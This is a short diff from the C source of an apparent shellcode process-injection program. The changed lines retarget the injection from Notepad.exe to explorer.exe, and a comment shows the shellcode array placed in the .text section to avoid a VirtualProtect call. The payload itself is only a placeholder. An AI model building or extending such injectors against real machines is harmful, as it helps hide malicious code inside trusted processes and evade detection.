@@ -5,7 +5,7 @@
 // shellcode array in the .text section with -Wl, --omagic to avoid the VirtualProtect call
 DOT_TEXT static unsigned char bytecode[SET_BYTECODE_SIZE] = SET_BYTECODE_ARRAY;
 DOT_TEXT static const int bytecode_size = SET_BYTECODE_SIZE;
-DOT_TEXT static char targetProcess[12] = "Notepad.exe";
+DOT_TEXT static char targetProcess[13] = "explorer.exe";
 
 /**
  * @brief Point d'entrée du programme d'injection.
